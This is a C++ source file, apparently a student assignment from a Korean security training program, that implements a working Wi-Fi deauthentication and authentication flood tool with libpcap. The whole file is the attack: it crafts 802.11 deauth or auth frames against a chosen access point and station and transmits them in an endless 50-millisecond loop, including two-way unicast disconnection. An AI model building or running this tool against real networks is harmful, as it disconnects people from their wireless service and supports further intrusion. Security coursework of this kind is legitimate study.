//20230118 Best of the Best 11th 이예찬
#include <pcap.h>
#include <iostream>
#include <string.h>
#include <unistd.h>
#include "mac.h"

using namespace std;

struct ieee80211_radiotap_header {
    u_char it_version;
    u_char it_pad;
    u_int16_t it_len;
	u_int32_t it_present_flags;
};

struct ieee80211_frame{
	u_int16_t frameCtl;
	u_int16_t duration;
	Mac dstAddr;
	Mac srcArrr;
	Mac bssId;
	u_int16_t Fraq_Squ_Number;
};

void usage() {
	printf("syntax : deauth-attack [interface] [ap mac] [[station mac] [-auth]]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char* argv[]) {
	Mac ap;
	Mac station;
	bool auth = false;

	switch (argc){
		case 5:
			if(string(argv[4]).compare("-auth") == 0)
				auth = true;
		case 4:
			station = Mac(argv[3]);
		case 3:
			ap = Mac(argv[2]);
			break;
		default:
			usage();
			return -1;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", argv[1], errbuf);
		return -1;
	}

	unsigned char packet[50] = {0, };
	unsigned char packet2[50] = {0, };
	unsigned char auth_param[] = {0x00, 0x00, 0x01, 0x00, 0x00, 0x00};
	unsigned char reason_code[] = {0x07, 0x00};

	//Radiotap Header 생성 및 초기화
	struct ieee80211_radiotap_header radiotap;
	memset(&radiotap, 0, 8);
	radiotap.it_len = htons(0x0800);
	
	//Beacon Frame 생성 및 설정
	struct ieee80211_frame frame;
	frame.duration = 0x013a;
	frame.bssId = ap;
	frame.Fraq_Squ_Number = 0x2960;
	if(auth){
		frame.frameCtl = 0x00b0;
		frame.dstAddr = ap;
		frame.srcArrr = station;
	}
	else{
		frame.frameCtl = 0x00c0;
		frame.dstAddr = (station.isNull()) ? Mac::broadcastMac() : station;
		frame.srcArrr = ap;
	}
	
	//Radiotap Header
	memcpy((char*)&packet, (char*)&radiotap, 8);
	//Authentication or Deauthentication
	memcpy((char*)&packet + 8, (char*)&frame, 24);
	//Wireless Management
	short length = (auth) ? 6 : 2;
	memcpy((char*)&packet + 32, (auth) ? (char*)&auth_param : (char*)&reason_code, length);
	length += 32;

	//양방향 Deauth Unicast
	bool swiching = (!station.isNull() && !auth);
	if(swiching){
		memcpy((char*)&packet2, (char*)&packet, length);
		//MAC Swap
		unsigned char tmp[6];
		memcpy((char*)&tmp, (char*)&packet + 12, 6);
		memcpy((char*)&packet + 12, (char*)&packet + 18, 6);
		memcpy((char*)&packet + 18, (char*)&tmp, 6);
	}

	cout << "BSSID : " << string(ap) << ", STATION : " << (station.isNull() ? "None" : string(station)) << ", Mode : " << ((auth) ? "Auth" : ((station.isNull()) ? "DeAuth - Broadcast" : "DeAuth - Unicast")) << endl;

	unsigned int loop = 0;
	while(true){
		usleep(50000);//50ms
		printf("Loop Count : %d\r", loop++);
		fflush(stdout);
		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), length);
		if(swiching)
			pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet2), length);
		if (res != 0) {
			fprintf(stderr, "Beacon_Flood::pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		}
	}

	pcap_close(pcap);
}
